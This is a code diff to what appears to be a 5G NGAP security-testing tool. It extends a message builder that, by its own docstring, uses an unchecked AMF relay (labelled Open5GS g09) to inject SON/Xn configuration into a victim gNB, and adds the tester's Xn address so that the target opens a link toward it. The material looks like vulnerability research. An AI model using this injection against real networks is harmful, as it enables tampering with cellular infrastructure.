@@ -714,16 +714,54 @@ def ran_configuration_update(cfg: dict, *, tac=None, ran_node_name: str = "ngap-
     })
 
 
+def _xn_tnl_configuration_info(ip: str) -> dict:
+    """Source NG-RAN Xn TNL (TS 38.413 XnTNLConfigurationInfo).
+
+    Mandatory when SON Information Request = xn-TNL-configuration-info: the
+    target uses these addresses to open Xn-C SCTP toward this node (Huawei
+    自建链). xnTransportLayerAddresses is Xn-C; the extended item repeats the
+    same IPv4 as GTP (Xn-U) and SCTP-TLAs (IE 173) so stacks that only read
+    the extension still have an address. No iPsecTLA.
+    """
+    tla = ip_to_bits(ip)
+    return {
+        "xnTransportLayerAddresses": [tla],
+        "xnExtendedTransportLayerAddresses": [{
+            "gTP-TLAs": [tla],
+            "iE-Extensions": [{
+                "id": 173,
+                "criticality": "ignore",
+                "extensionValue": ("SCTP-TLAs", [tla]),
+            }],
+        }],
+    }
+
+
+def _xn_tnl_ip(cfg: dict, xn_ip: str | None = None) -> str:
+    if xn_ip:
+        return xn_ip
+    for key in ("xn_ip", "bind_ip"):
+        val = cfg.get(key)
+        if val not in (None, "", "auto"):
+            return str(val)
+    return "127.0.0.1"
+
+
 def uplink_ran_configuration_transfer(cfg: dict, *, target_gnb_id: int,
                                       source_gnb_id: int | None = None, tac=None,
                                       target_gnb_id_len: int | None = None,
-                                      source_gnb_id_len: int | None = None):
+                                      source_gnb_id_len: int | None = None,
+                                      xn_ip: str | None = None):
     """UPLINK RAN CONFIGURATION TRANSFER (Class 2, procedureCode 48). Open5GS g09.
 
     Blind relay: the AMF forwards the carried SONConfigurationTransfer to the
     attacker-named `target_gnb_id` (DOWNLINK RAN CONFIGURATION TRANSFER), with no
     check that source/target are real neighbours -> inject SON/Xn config toward a
     victim gNB the attacker does not control.
+
+    `xnTNLConfigurationInfo` is the source (this tester, default gNB-id 4660)
+    Xn address the target needs to initiate Xn Setup. Spec: SHALL be present
+    when sONInformationRequest is xn-TNL-configuration-info.
     """
     plmn = encode_plmn(cfg["mcc"], cfg["mnc"])
     tac_b = int(cfg["tac"] if tac is None else tac).to_bytes(3, "big")
@@ -731,7 +769,8 @@ def uplink_ran_configuration_transfer(cfg: dict, *, target_gnb_id: int,
     if source_gnb_id is None:
         source_gnb_id = int(cfg.get("gnb_id", 4660))
     tgt_len = int(target_gnb_id_len if target_gnb_id_len is not None else 32)
-    src_len = int(source_gnb_id_len if source_gnb_id_len is not None else 32)
+    src_len = int(source_gnb_id_len if source_gnb_id_len is not None
+                  else cfg.get("gnb_id_len", 32))
     son = {
         "targetRANNodeID-SON": {
             "globalRANNodeID": _global_gnb_id(cfg, target_gnb_id, gnb_id_len=tgt_len),
@@ -740,6 +779,7 @@ def uplink_ran_configuration_transfer(cfg: dict, *, target_gnb_id: int,
             "globalRANNodeID": _global_gnb_id(cfg, source_gnb_id, gnb_id_len=src_len),
             "selectedTAI": tai},
         "sONInformation": ("sONInformationRequest", "xn-TNL-configuration-info"),
+        "xnTNLConfigurationInfo": _xn_tnl_configuration_info(_xn_tnl_ip(cfg, xn_ip)),
     }
     ies = [
         {"id": 99, "criticality": "ignore",
